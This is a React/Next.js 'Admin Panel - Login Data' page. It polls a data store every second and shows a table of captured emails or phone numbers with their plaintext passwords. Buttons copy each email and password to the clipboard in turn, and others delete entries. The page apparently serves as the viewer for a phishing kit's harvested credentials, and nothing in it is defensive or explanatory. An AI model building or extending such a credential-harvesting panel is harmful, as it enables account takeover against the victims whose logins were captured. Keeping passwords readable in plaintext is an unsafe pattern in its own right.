"use client";

import { getAllData, deleteData } from "../../lib/data.js";
import { useState, useEffect } from "react";

export default function AdminPage() {
  const [data, setData] = useState(getAllData());
  const [copyStep, setCopyStep] = useState(null);

  useEffect(() => {
    const interval = setInterval(() => {
      setData(getAllData());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleCopy = async (email, password) => {
    setCopyStep("email");
    await navigator.clipboard.writeText(email);
    setTimeout(() => {
      setCopyStep("password");
      navigator.clipboard.writeText(password);
      setTimeout(() => setCopyStep(null), 500);
    }, 500);
  };

  const handleDelete = (index) => {
    deleteData(index);
    setData(getAllData());
  };

  return (
    <div className="admin-container">
      <h1>Admin Panel - Login Data</h1>
      {data.length === 0 ? (
        <p className="empty-message">No data yet.</p>
      ) : (
        <table className="admin-table">
          <thead>
            <tr>
              <th>#</th>
              <th>Email/Phone</th>
              <th>Password</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {data.map((item, index) => (
              <tr key={index}>
                <td>{index + 1}</td>
                <td>{item.email}</td>
                <td>{item.password}</td>
                <td>
                  <button
                    className="btn btn-copy"
                    onClick={() => handleCopy(item.email, item.password)}
                  >
                    {copyStep === "email" ? "Copying Email..." : copyStep === "password" ? "Copied Password" : "Copy"}
                  </button>
                  <button
                    className="btn btn-delete"
                    onClick={() => handleDelete(index)}
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
